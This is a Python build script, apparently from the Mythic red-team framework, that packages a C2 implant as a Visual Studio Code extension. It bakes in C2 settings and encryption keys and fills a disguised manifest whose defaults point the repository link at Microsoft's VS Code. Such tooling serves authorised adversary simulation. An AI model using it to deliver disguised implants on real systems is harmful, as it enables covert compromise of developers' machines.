from mythic_payloadtype_container.PayloadBuilder import *
from mythic_payloadtype_container.MythicCommandBase import *
import asyncio
import json
from distutils.dir_util import copy_tree
import shutil
import tempfile

# Icons made by "https://www.flaticon.com/authors/freepik" "Freepik"

class Venus(PayloadType):

    name = "venus"
    file_extension = "zip"
    author = "@mattreduce"
    supported_os = [
            SupportedOS.Linux,
            SupportedOS.MacOS,
            SupportedOS.Windows
    ]
    wrapper = False
    wrapped_payloads = []
    note = "This payload uses JavaScript for execution in the context of Visual Studio Code via an Extension"
    supports_dynamic_loading = False
    build_parameters = [
        BuildParameter(
            name="name",
            parameter_type=BuildParameterType.String,
            description="Name of your extension",
            default_value="venus",
            required=True,
        ),
        BuildParameter(
            name="display_name",
            parameter_type=BuildParameterType.String,
            description="Human-friendly display name of your extension",
            default_value="Venus",
            required=True,
        ),
        BuildParameter(
            name="description",
            parameter_type=BuildParameterType.String,
            description="Description of your extension",
            default_value="Venus is a Visual Studio Code extension",
            required=True,
        ),
        BuildParameter(
            name="publisher",
            parameter_type=BuildParameterType.String,
            description="Publisher of your extension",
            default_value="corp",
            required=True,
        ),
        BuildParameter(
            name="repository",
            parameter_type=BuildParameterType.String,
            description="Link to extension source code",
            default_value="https://github.com/microsoft/vscode",
            required=True,
        ),
        BuildParameter(
            name="version",
            parameter_type=BuildParameterType.String,
            description="Version of your extension",
            default_value="0.3.0",
            required=False,
        )
    ]

    c2_profiles = ["http"]
    mythic_encrypts = True
    translation_container = None

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Error)

        build_msg = ""
        try:
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
            copy_tree(self.agent_code_path, agent_build_path.name)

            # Replace placeholder values in extension source
            extension = open(
                "{}/extension.js".format(agent_build_path.name), "r"
            ).read()

            # Bake in UUID of the payload being generated
            modified = extension.replace("REPLACE_PAYLOAD_UUID", self.uuid)

            # Ensure only one C2 Profile is configured for this payload
            if len(self.c2info) != 1:
                resp.build_stderr = "Apfell only supports one C2 Profile at a time"
                resp.set_status(BuildStatus.Error)
                return resp

            for c2 in self.c2info:
                try:
                    profile = c2.get_c2profile()

                    if profile["name"] == "http":
                        for key, val in c2.get_parameters_dict().items():
                            if isinstance(val, dict):
                                modified = modified.replace(key, val["enc_key"] if val["enc_key"] is not None else "")
                            elif not isinstance(val, str):
                                modified = modified.replace(key, json.dumps(val))
                            else:
                                modified = modified.replace(key, val)
                    else:
                        raise Exception("Venus does not support the {} C2 Profile".format(profile["name"]))
                except Exception as p:
                    build_msg += str(p)

            extension = open(
                "{}/extension.js".format(agent_build_path.name), "w"
            ).write(modified)

            # Replace placeholder values in extension manifest
            manifest = open(
                "{}/package.json".format(agent_build_path.name), "r"
            ).read()

            modified2 = manifest.replace("replace_extension_name",
                self.get_parameter('name'))
            modified2 = modified2.replace("REPLACE_DISPLAY_NAME",
                self.get_parameter('display_name'))
            modified2 = modified2.replace("REPLACE_DESCRIPTION",
                self.get_parameter('description'))
            modified2 = modified2.replace("REPLACE_PUBLISHER",
                self.get_parameter('publisher'))
            modified2 = modified2.replace("REPLACE_REPOSITORY",
                self.get_parameter('repository'))
            modified2 = modified2.replace("REPLACE_VERSION",
                self.get_parameter('version'))

            manifest = open(
                "{}/package.json".format(agent_build_path.name), "w"
            ).write(modified2)

            # Make a downloadable ZIP archive of modified extension source
            try:
                temp_uuid = str(uuid.uuid4())
                shutil.make_archive(
                    "{}".format(temp_uuid),
                    "zip",
                    "{}".format(agent_build_path.name),
                )
                resp.payload = open(
                    "{}.zip".format(temp_uuid), "rb"
                ).read()
            except Exception as p:
                build_msg += str(p)

            if build_msg != "":
                resp.build_stderr = build_msg
                resp.set_status(BuildStatus.Error)
            else:
                resp.set_status(status=BuildStatus.Success)
                resp.build_message = "Created ZIP archive of VS Code extension files"

        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)

        return resp
